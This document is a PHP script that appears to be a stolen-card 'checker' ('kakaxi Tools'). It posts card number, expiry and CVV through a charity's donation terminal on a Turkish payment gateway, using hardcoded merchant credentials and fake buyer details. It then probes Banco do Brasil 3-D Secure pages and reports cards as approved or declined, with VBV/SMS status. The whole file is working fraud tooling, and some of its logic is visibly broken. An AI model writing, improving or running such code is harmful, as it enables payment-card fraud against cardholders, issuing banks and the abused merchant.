﻿<?php
session_start();
error_reporting(0);
$time = time();
  
if (file_exists("cookie.txt")) {
unlink("cookie.txt");}

$time = time();

function multiexplode($delimiters, $string) {
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}

///Divisorias
$lista = $_GET['lista'];
$cc = multiexplode(array("|", " "), $lista)[0];
$mes = multiexplode(array("|", " "), $lista)[1];
$ano = multiexplode(array("|", " "), $lista)[2];
$cvv = multiexplode(array("|", " "), $lista)[3];




///BUSCAR BIN
$bin = substr($cc, 0, 6); 

$file = 'bins.csv'; 

$searchfor = $bin; 
$contents = file_get_contents($file); 
$pattern = preg_quote($searchfor, '/'); 
$pattern = "/^.*$pattern.*\$/m"; 
if (preg_match_all($pattern, $contents, $matches)) { 
  $encontrada = implode("\n", $matches[0]); 
} 
$pieces = explode(";", $encontrada); 
$c = count($pieces); 
if ($c == 8) { 
  $pais = $pieces[4]; 
  $paiscode = $pieces[5]; 
  $banco = $pieces[2]; 
  $level = $pieces[3]; 
  $bandeira = $pieces[1]; 
}else { 
  $pais = $pieces[5]; 
  $paiscode = $pieces[6]; 
  $level = $pieces[4]; 
  $banco = $pieces[2]; 
  $bandeira = $pieces[1]; 
} 
 
$bin_result = "$bandeira $banco $level $pais";
$bin=substr($cc,0,6);

function getStr($string, $start, $end) {
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}

$card=explode("|",$_GET['lista']);
$cc=$card[0];
$time = time();
$bin = substr($cc, 0, 2);
$mes=$card[1];
$ano=$card[2];
$cvv=$card[3];

switch ($ano) { 
         case '2018':$mes = '18';break; 
         case '2019':$ano = '19';break; 
         case '2020':$ano = '20';break; 
         case '2021':$ano = '21';break; 
         case '2022':$ano = '22';break; 
         case '2023':$ano = '23';break; 
         case '2024':$ano = '24';break; 
         case '2025':$ano = '25';break; 
         case '2026':$ano = '26';break; 
         case '2027':$ano = '27';break; 
         case '2028':$ano = '28';break; 
}

function getStr2($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

function dadosnome() {
	$nome = file("lista_nomes.txt");
	$mynome = rand(0, sizeof($nome)-1);
	$nome = $nome[$mynome];
	return $nome;
}
function dadossobre() {
	$sobrenome = file("lista_sobrenomes.txt");
	$mysobrenome = rand(0, sizeof($sobrenome)-1);
	$sobrenome = $sobrenome[$mysobrenome];
	return $sobrenome;

}

function ano12() {
	switch ($ano) {
		case '20': $ano = '2020'; break;
		case '21': $ano = '2021'; break;
		case '22': $ano = '2022'; break;
		case '23': $ano = '2023'; break;
		case '24': $ano = '2024'; break;
		case '25': $ano = '2025'; break;
		case '26': $ano = '2026'; break;
		case '27': $ano = '2027'; break;
		case '28': $ano = '2028'; break;
		case '29': $ano = '2029'; break;
	}}
function mes12() {
	switch ($mes) {
		case '1': $mes = '01'; break;
		case '2': $mes = '02'; break;
		case '3': $mes = '03'; break;
		case '4': $mes = '04'; break;
		case '5': $mes = '05'; break;
		case '6': $mes = '06'; break;
		case '7': $mes = '07'; break;
		case '8': $mes = '08'; break;
		case '9': $mes = '09'; break;
		case '10': $mes = '10'; break;
		case '11': $mes = '11'; break;
		case '12': $mes = '12'; break;
}}



if($bin[0] == 4){ //visa
    $host          = 'www58.bb.com.br';
    $auth          = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/auth.bb';
    $inicio        = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/inicio.bb';
    $customer      = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/customer.bb';
    $r_customer    = 'https://www58.bb.com.br/ThreeDSecureAuth/gcs/statics/gas/validacao.bb?urlRetorno=/ThreeDSecureAuth/vbvLogin/customer.bb';    
}else{ //master
    $host          = 'www66.bb.com.br';
    $auth          = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/auth.bb';
    $inicio        = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/inicio.bb';
    $customer      = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/customer.bb';
    $r_customer    = 'https://www66.bb.com.br/SecureCodeAuth/gcs/statics/gas/validacao.bb?urlRetorno=/SecureCodeAuth/scdLogin/customer.bb';    
}

///CURL PAGAMETO
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://sanalposprov.garanti.com.tr/servlet/gt3dengine");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

  'Host: sanalposprov.garanti.com.tr',
  'Connection: keep-alive',

  'Cache-Control: max-age=0',
  'Upgrade-Insecure-Requests: 1',
  'Origin: https://tcydv.org',
  'Content-Type: application/x-www-form-urlencoded',
  
    'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-A205G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
   
   'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
   
   'Sec-Fetch-Site: cross-site',
   'Sec-Fetch-Mode: navigate',
   'Sec-Fetch-Dest: document',
  'Referer: https://tcydv.org/'
)); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'secure3dsecuritylevel=3D_FULL&cardnumber='.$cc.'&cardexpiredatemonth='.$mes.'&cardexpiredateyear='.$ano.'&cardcvv2='.$cvv.'&mode=PROD&apiversion=v0.01&terminalprovuserid=PROVAUT&terminaluserid=10068218&terminalmerchantid=9473486&txntype=sales&txnamount=10000&txncurrencycode=949&txninstallmentcount=&orderid=911676920220221053059000000&terminalid=10068218&successurl=https%3A%2F%2Ftcydv.org%2Fonline-bagis%2F%3Fac%3Dok&errorurl=https%3A%2F%2Ftcydv.org%2Fonline-bagis%2F%3Fac%3Dnotok&customeripaddress=177.25.137.52&customeremailaddress=mariacasteo09%40gmail.com&secure3dhash=B33D1EE26DB07B5DC484F51416CE9764173F06EC&orderaddresstext1=Rua+Angelo&orderaddresscity1=Sao+paulo&orderaddressdistrict1=Sao+paulo&orderaddressaciklama=&orderaddressgsmnumber1=11937765356&orderaddressname1=Joao+Gomes');

$result = curl_exec($ch);
        # echo $result;
     
     
#Fim
$pareq=urlencode(getstr($result,'"PaReq" value="','"'));
$term=urlencode(getstr($result,'"TermUrl" value="','"'));
$md=urlencode(getstr($result,'"MD" value="','"'));

///CURL HOST BB
sleep (1);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $inicio);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE,__DIR__.'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,__DIR__.'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, "TermUrl=$term&PaReq=$pareq&MD=$md");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: '.$host;
$headers[] = 'Cache-Control: max-age=0';
$headers[] = 'Sec-Ch-Ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Origin: https://www66.bb.com.br';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Dnt: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Referer: '.$auth;
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9';
$headers[] = 'Cookie: _gcl_au=1.1.1225580064.1618783654; JSESSIONID=vMvxRyCTASeJ1D-tES164zplu4fveFR_eVHFA6_NknzmRUZywnpX!1714524820';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);

///Aprovadas-Reprovadas
if (strpos($result, 'Abra')) {
    
    
exit('<b><span class="badge badge-success badge-glow"> aprovadas </span> → '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'  </span> '.$bandeira.' '.$banco.' '.$level.' '.$pais.' <span class="badge badge-info">[  QR CODE ]</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');

}elseif (strpos($result, 'Clique em Voltar para retornar ao site da loja e escolha outra forma de pagamento')) {
	exit("<span class='badge badge-danger'>#Reprovada</span><span style='color:white;'> $lista</span> <span style='color:red;'>(CARTAO RECUSADO!)</span> <span class='badge badge-light'> [kakaxi Tools]</span>");
}





 ///CURL CUSTOMER
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $customer);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE,__DIR__.'/cookie.txt');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: '.$host;
$headers[] = 'Sec-Ch-Ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Dnt: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Referer: '.$r_customer;
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);

////Aprovadas-Reprovadas


if (strpos($result, 'Prezado cliente')) {


exit('<b><span class="badge badge-success badge-glow"> aprovadas </span> → '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'  </span> '.$bandeira.' '.$banco.' '.$level.' '.$pais.' <span class="badge badge-info">[  SEM VBV ] </span> ➜ ' . (time() - $time) .  ' Seg</b><br>');}

if (strpos($result, 'confirmação')) {


exit('<b><span class="badge badge-success  badge-glow"> aprovadas </span> → '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'  </span> '.$bandeira.' '.$banco.' '.$level.' '.$pais.' <span class="badge badge-info">[  SMS ]</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');}


else{
exit('<b><span class="badge badge-danger badge-glow"> reprovadas </span> → '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'  </span> <span class="badge badge-info"> Retorno:</span> Cartao Recusado </span> ➜ ' . (time() - $time) .  ' Seg</b><br>');}
?>